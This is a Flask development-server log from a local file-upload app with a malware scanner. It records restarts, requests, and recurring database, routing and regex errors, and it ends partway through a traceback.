2025-02-22 16:25:57,420 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:25:57,420 - [33mPress CTRL+C to quit[0m
2025-02-22 16:26:06,208 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:26:06,208 - [33mPress CTRL+C to quit[0m
2025-02-22 16:26:27,732 - 127.0.0.1 - - [22/Feb/2025 16:26:27] "GET / HTTP/1.1" 200 -
2025-02-22 16:26:29,403 - 127.0.0.1 - - [22/Feb/2025 16:26:29] "GET / HTTP/1.1" 200 -
2025-02-22 16:27:10,999 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:27:10,999 - [33mPress CTRL+C to quit[0m
2025-02-22 16:27:12,847 - 127.0.0.1 - - [22/Feb/2025 16:27:12] "GET / HTTP/1.1" 200 -
2025-02-22 16:28:12,596 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:28:12,596 - [33mPress CTRL+C to quit[0m
2025-02-22 16:28:16,855 - 127.0.0.1 - - [22/Feb/2025 16:28:16] "GET / HTTP/1.1" 200 -
2025-02-22 16:28:17,888 - 127.0.0.1 - - [22/Feb/2025 16:28:17] "GET / HTTP/1.1" 200 -
2025-02-22 16:28:25,891 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 91, in upload_file
    cursor.execute("INSERT INTO files (filename, content, status) VALUES (?, ?, ?)", (file.filename, "Uploaded", status))
sqlite3.OperationalError: table files has no column named status
2025-02-22 16:28:25,893 - 127.0.0.1 - - [22/Feb/2025 16:28:25] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 16:30:11,975 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:30:11,975 - [33mPress CTRL+C to quit[0m
2025-02-22 16:30:15,760 - 127.0.0.1 - - [22/Feb/2025 16:30:15] "GET / HTTP/1.1" 200 -
2025-02-22 16:30:16,902 - 127.0.0.1 - - [22/Feb/2025 16:30:16] "GET / HTTP/1.1" 200 -
2025-02-22 16:30:17,080 - 127.0.0.1 - - [22/Feb/2025 16:30:17] "GET / HTTP/1.1" 200 -
2025-02-22 16:30:17,824 - 127.0.0.1 - - [22/Feb/2025 16:30:17] "GET / HTTP/1.1" 200 -
2025-02-22 16:30:18,005 - 127.0.0.1 - - [22/Feb/2025 16:30:18] "GET / HTTP/1.1" 200 -
2025-02-22 16:30:42,695 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 99, in upload_file
    cursor.execute("INSERT INTO files (filename, content, status) VALUES (?, ?, ?)", (file.filename, "Uploaded", status))
sqlite3.OperationalError: table files has no column named status
2025-02-22 16:30:42,697 - 127.0.0.1 - - [22/Feb/2025 16:30:42] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 16:30:57,532 - 127.0.0.1 - - [22/Feb/2025 16:30:57] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:30:57,537 - 127.0.0.1 - - [22/Feb/2025 16:30:57] "GET / HTTP/1.1" 200 -
2025-02-22 16:32:43,838 - 127.0.0.1 - - [22/Feb/2025 16:32:43] "[31m[1mPOST /upload HTTP/1.1[0m" 400 -
2025-02-22 16:32:48,880 - 127.0.0.1 - - [22/Feb/2025 16:32:48] "GET / HTTP/1.1" 200 -
2025-02-22 16:32:50,688 - 127.0.0.1 - - [22/Feb/2025 16:32:50] "[31m[1mPOST /upload HTTP/1.1[0m" 400 -
2025-02-22 16:32:53,090 - 127.0.0.1 - - [22/Feb/2025 16:32:53] "GET / HTTP/1.1" 200 -
2025-02-22 16:36:46,403 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:36:46,422 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:36:46,423 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:36:46,424 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:36:46,424 - [33mPress CTRL+C to quit[0m
2025-02-22 16:36:51,331 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:36:51,334 - 127.0.0.1 - - [22/Feb/2025 16:36:51] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:37:06,444 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:37:06,445 - 127.0.0.1 - - [22/Feb/2025 16:37:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:37:06,609 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:37:06,611 - 127.0.0.1 - - [22/Feb/2025 16:37:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:37:06,781 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:37:06,782 - 127.0.0.1 - - [22/Feb/2025 16:37:06] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:37:13,994 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:37:13,995 - 127.0.0.1 - - [22/Feb/2025 16:37:13] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:37:14,174 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:37:14,176 - 127.0.0.1 - - [22/Feb/2025 16:37:14] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:37:14,354 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:37:14,355 - 127.0.0.1 - - [22/Feb/2025 16:37:14] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:37:24,792 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:37:24,811 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:37:24,811 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:37:24,813 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:37:24,813 - [33mPress CTRL+C to quit[0m
2025-02-22 16:37:31,657 - Exception on / [GET]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 72, in index
    return render_template('index.html', files=files)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 150, in render_template
    return _render(app, template, context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/templating.py", line 131, in _render
    rv = template.render(context)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 1304, in render
    self.environment.handle_exception()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/jinja2/environment.py", line 939, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "/home/shakti/Desktop/flask_file_upload/templates/index.html", line 31, in top-level template code
    <a href="{{ url_for('delete_file', file_id=file[0]) }}">Delete</a>
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1084, in url_for
    return self.handle_url_build_error(error, endpoint, values)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1073, in url_for
    rv = url_adapter.build(  # type: ignore[union-attr]
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/werkzeug/routing/map.py", line 924, in build
    raise BuildError(endpoint, values, method, self)
werkzeug.routing.exceptions.BuildError: Could not build url for endpoint 'delete_file' with values ['file_id']. Did you mean 'upload_file' instead?
2025-02-22 16:37:31,660 - 127.0.0.1 - - [22/Feb/2025 16:37:31] "[35m[1mGET / HTTP/1.1[0m" 500 -
2025-02-22 16:38:51,381 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:38:51,401 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:38:51,401 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:38:51,403 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:38:51,403 - [33mPress CTRL+C to quit[0m
2025-02-22 16:38:55,043 - 127.0.0.1 - - [22/Feb/2025 16:38:55] "GET / HTTP/1.1" 200 -
2025-02-22 16:39:02,413 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:39:02,413 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
  File "app.py", line 99, in upload_file
    cursor.execute("INSERT INTO files (filename, status) VALUES (?, ?)", (file.filename, "Safe"))
sqlite3.OperationalError: table files has no column named status
2025-02-22 16:39:02,414 - 127.0.0.1 - - [22/Feb/2025 16:39:02] "[35m[1mPOST /upload HTTP/1.1[0m" 500 -
2025-02-22 16:39:31,596 - Malicious pattern detected in uploads/app.py
2025-02-22 16:39:31,597 - 127.0.0.1 - - [22/Feb/2025 16:39:31] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:39:31,601 - 127.0.0.1 - - [22/Feb/2025 16:39:31] "GET / HTTP/1.1" 200 -
2025-02-22 16:40:01,724 - 127.0.0.1 - - [22/Feb/2025 16:40:01] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:40:01,729 - 127.0.0.1 - - [22/Feb/2025 16:40:01] "GET / HTTP/1.1" 200 -
2025-02-22 16:41:04,259 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:41:04,280 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:41:04,280 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:41:23,482 - Error scanning uploads/5-A.R: missing ), unterminated subpattern at position 17
2025-02-22 16:41:23,502 - Error scanning uploads/C-Class-shaktiweek2019.pdf: missing ), unterminated subpattern at position 17
2025-02-22 16:41:23,502 - Error scanning uploads/mixed_cluster.bsv: missing ), unterminated subpattern at position 17
2025-02-22 16:41:23,504 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 16:41:23,504 - [33mPress CTRL+C to quit[0m
2025-02-22 16:41:29,781 - 127.0.0.1 - - [22/Feb/2025 16:41:29] "GET / HTTP/1.1" 200 -
2025-02-22 16:41:40,260 - 127.0.0.1 - - [22/Feb/2025 16:41:40] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 16:41:40,265 - 127.0.0.1 - - [22/Feb/2025 16:41:40] "GET / HTTP/1.1" 200 -
2025-02-22 16:41:53,808 - Error scanning uploads/6.js: missing ), unterminated subpattern at position 17
2025-02-22 16:41:53,809 - Exception on /upload [POST]
Traceback (most recent call last):
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 1473, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 882, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 880, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/shakti/.pyenv/versions/3.8.10/envs/py38/lib/python3.8/site-packages/flask/app.py", line 865, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
